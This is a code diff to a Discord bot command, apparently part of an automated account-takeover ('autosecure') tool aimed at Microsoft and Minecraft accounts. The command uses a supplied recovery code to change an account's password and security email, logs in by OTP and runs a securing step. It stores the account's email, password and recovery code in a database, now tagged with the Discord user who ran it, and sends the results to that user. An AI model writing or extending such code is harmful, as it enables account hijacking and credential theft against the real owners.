@@ -21,7 +21,7 @@ async function couldntFullSecure(interaction, data, reason, uid) {
     let recsecId = generate(32);
     await queryParams(
         `INSERT INTO actions(id, action) VALUES(?, ?)`,
-        [`${recsecId}`, `copyrec|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
+        [`${recsecId}`, `copyrec|${interaction.user.id}|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
     );
 
     if (uid) {
@@ -156,9 +156,10 @@ module.exports = {
             components: statusComponents
         }).catch(console.error);
 
+        let data = null;
         try {
-            const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);
-            console.log('recoveryCodeSecure response:', JSON.stringify(data, null, 2));
+            data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);
+            console.log('[REC_SECURE] recoveryCodeSecure completed with status:', data ? (typeof data === 'string' ? data : 'success') : 'failed');
 
             if (data === null) {
                 return interaction.editReply({ content: `❌ Invalid email address`, embeds: [], components: [] }).catch(() => {});
@@ -224,36 +225,47 @@ module.exports = {
             }
 
             if (otpSent && code) {
-                const host = await login({ email: data.email2, id: secEmail1.data, code: code }, null);
+                let host = null;
+                try {
+                    host = await login({ email: data.email2, id: secEmail1.data, code: code }, null);
+                } catch (loginErr) {
+                    console.error("[RECSECURE] Login error:", loginErr.message);
+                }
+
                 if (!host) {
-                    return couldntFullSecure(interaction, data, "OTP Disabled before login!", uid);
+                    return couldntFullSecure(interaction, data, "OTP login failed. Password & security email were changed successfully.", uid);
                 }
 
                 const processEndTime = Date.now();
                 const rectaken = (processEndTime - processStartTime) / 1000;
 
-                const acc = await secure(host, settings, uid, mcign);
-                await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);
+                try {
+                    const acc = await secure(host, settings, uid, mcign);
+                    await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);
 
-                const failedmsg = await failedembed(acc, uid);
-                if (failedmsg.failed) {
-                    await interaction.followUp(failedmsg.failedmsg).catch(() => {});
-                    await interaction.user.send(failedmsg.failedmsg).catch(() => {});
+                    const failedmsg = await failedembed(acc, uid);
+                    if (failedmsg.failed) {
+                        await interaction.followUp(failedmsg.failedmsg).catch(() => {});
+                        await interaction.user.send(failedmsg.failedmsg).catch(() => {});
+                        return;
+                    }
+
+                    let timetaken = parseFloat(acc.timeTaken) + rectaken;
+                    acc.timeTaken = Math.round(timetaken);
+
+                    const msg = await listAccount(acc, uid, client, interaction);
+
+                    await interaction.followUp({
+                        ...msg,
+                        ephemeral: true
+                    }).catch(() => {});
+                    await interaction.user.send(msg).catch(() => {});
+
                     return;
+                } catch (secErr) {
+                    console.error("[RECSECURE] Error in secure():", secErr);
+                    return couldntFullSecure(interaction, data, `Securing incomplete: ${secErr.message}`, uid);
                 }
-
-                let timetaken = parseFloat(acc.timeTaken) + rectaken;
-                acc.timeTaken = Math.round(timetaken);
-
-                const msg = await listAccount(acc, uid, client, interaction);
-
-                await interaction.followUp({
-                    ...msg,
-                    ephemeral: true
-                }).catch(() => {});
-                await interaction.user.send(msg).catch(() => {});
-
-                return;
             } else {
                 let reason;
                 if (!otpSent) {
@@ -267,6 +279,9 @@ module.exports = {
             }
         } catch (err) {
             console.error('[RECSECURE] Unexpected error:', err);
+            if (data?.email2 && data?.password) {
+                return couldntFullSecure(interaction, data, err.message, uid);
+            }
             await interaction.editReply({
                 content: `❌ An unexpected error occurred during securing: ${err.message}`,
                 embeds: [],
